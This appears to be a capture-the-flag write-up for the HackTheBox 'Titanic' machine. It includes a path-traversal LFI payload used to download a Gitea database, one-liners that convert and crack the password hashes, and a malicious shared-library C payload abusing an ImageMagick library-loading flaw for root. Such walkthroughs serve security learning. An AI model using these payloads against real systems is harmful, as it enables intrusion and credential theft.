```json
Alias: Titanic
Date: 28-02_2025
Platform: Hackthebox
OS: Linux
Difficulty: Easy
Status: Complete
IP: 10.10.11.55
```

# Titanic
# Summary

Titanic is an easy box, in which we leverage an LFI to exfiltrate a `Gitea` database and crack the hashes present in it. We then leverage a script run by root which uses ImageMagick to privesc.
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-28 09:13 PKT
Nmap scan report for 10.10.11.55
Host is up (0.57s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.74 seconds

```
## Discovered Subdomains
```
best.test.com
```

---
# Enumeration

There is a booking mechanism in port 80, We can generate tickets and download from `titanic.htb/download?ticket=ticket.json`, this functionality has an LFI, `titanic.htb/download?ticket=../../../../etc/passwd`.

If we enumerate for subdomains we find `dev.titanic.htb`, which has an instance of `gitea` running. Looking through the repositories we can find `http://dev.titanic.htb/developer/docker-config/src/branch/main/gitea/docker-compose.yml`. This tells us that:

```yml
volumes:
- /home/developer/gitea/data:/data
```


---

# Exploitation

So to find the directory structure of the data directory, I copy the docker compose and set up my own `gitea` instance.

```
.
├── git
│   ├── lfs
│   └── repositories
│       └── developer
│           └── docker-compose.git
│               ├── branches
│               ├── config
│               ├── description
│               ├── git-daemon-export-ok
│               ├── HEAD
│               ├── hooks
│               │   ├── applypatch-msg.sample
│               │   ├── commit-msg.sample
│               │   ├── post-receive
│               │   ├── post-receive.d
│               │   │   └── gitea
│               │   ├── post-update.sample
│               │   ├── pre-applypatch.sample
│               │   ├── pre-commit.sample
│               │   ├── pre-merge-commit.sample
│               │   ├── prepare-commit-msg.sample
│               │   ├── pre-push.sample
│               │   ├── pre-rebase.sample
│               │   ├── pre-receive
│               │   ├── pre-receive.d
│               │   │   └── gitea
│               │   ├── pre-receive.sample
│               │   ├── proc-receive
│               │   ├── proc-receive.d
│               │   │   └── gitea
│               │   ├── push-to-checkout.sample
│               │   ├── sendemail-validate.sample
│               │   ├── update
│               │   ├── update.d
│               │   │   └── gitea
│               │   └── update.sample
│               ├── info
│               │   ├── exclude
│               │   └── refs
│               ├── logs
│               │   ├── HEAD
│               │   └── refs
│               │       └── heads
│               │           └── main
│               ├── objects
│               │   ├── 1d
│               │   │   └── 2f01491f783c8c7f0917cc68526c6307d80e39
│               │   ├── 4c
│               │   │   └── 9d17a2fc325c800b804fa0953a853022cb6277
│               │   ├── 84
│               │   │   └── f9810b36a53c205fa0fe83e47399fa996df876
│               │   ├── info
│               │   │   └── packs
│               │   └── pack
│               └── refs
│                   ├── heads
│                   │   └── main
│                   └── tags
├── gitea
│   ├── actions_artifacts
│   ├── actions_log
│   ├── attachments
│   ├── avatars
│   │   ├── e2d95b7e207e432f62f3508be406c11b
│   │   └── tmp
│   ├── conf
│   │   └── app.ini
│   ├── gitea.db
│   ├── home
│   ├── indexers
│   │   └── issues.bleve
│   │       ├── index_meta.json
│   │       ├── rupture_meta.json
│   │       └── store
│   │           └── root.bolt
│   ├── jwt
│   │   └── private.pem
│   ├── log
│   ├── packages
│   ├── queues
│   │   └── common
│   │       ├── 000001.log
│   │       ├── CURRENT
│   │       ├── LOCK
│   │       ├── LOG
│   │       └── MANIFEST-000000
│   ├── repo-archive
│   ├── repo-avatars
│   ├── sessions
│   │   ├── 1
│   │   │   └── a
│   │   └── 5
│   │       └── a
│   │           └── 5a02cef6a2cf7707
│   └── tmp
│       ├── local-repo
│       └── package-upload
└── ssh  [error opening dir]
```

The interesting file is, first: `gitea/conf/app.ini`. Using the LFI to retrieve this I can confirm that the sqlite database is being used in the docker instance. I get the db using the LFI.

```
http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/gitea.db
```

We can get the hashes from the database. For hashcat:

```bash
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
```

```bash
hashcat gitea.hashes ~/Documents/Wordlists/rockyou.txt --user
```

for john:

```bash
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64 | sed 's/+/./g' | sed 's/=//g' | cut -c1-43); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64 | sed 's/+/./g' | sed 's/=//g'); echo "\$pbkdf2-sha256\$50000\$${salt}:${digest}"; done > john.hash
```

```bash
john --format=pbkdf2-hmac-sha256 --wordlist=~/Documents/Wordlists/rockyou.txt john.hash
```

We get the password:

| Username  | Password |
| --------- | -------- |
| developer | 25282528 |
We can then ssh into developer.

---
# Privilege Escalation

`/op/scripts` contains an interesting script that uses ImageMagick

```bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

The file metadata.log is not writable by our user, which means this is being run by some other user. Searching for the ImageMagick version, I found this: https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8.

If the `LD_LIBRARY_PATH` is empty, it will look for the shared library in the current directory. As the images folder is writable by us, we can put a shared library that it is searching for in the current directory and execute arbitrary code as root.

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("/bin/bash -c \"cat /root/root.txt > /tmp/test\"");
    exit(0);
}
EOF
```

Next add another image to the images directory:

```bash
cp home.jpg home1.jpg
```

After a while:

```bash
cat /tmp/test
```

---

# Flags
- 7dd35033c5a0d4fedaa92d4d95848789
- 375f6aaa36ccd0c8ed8427f3bd5454b2

#CTF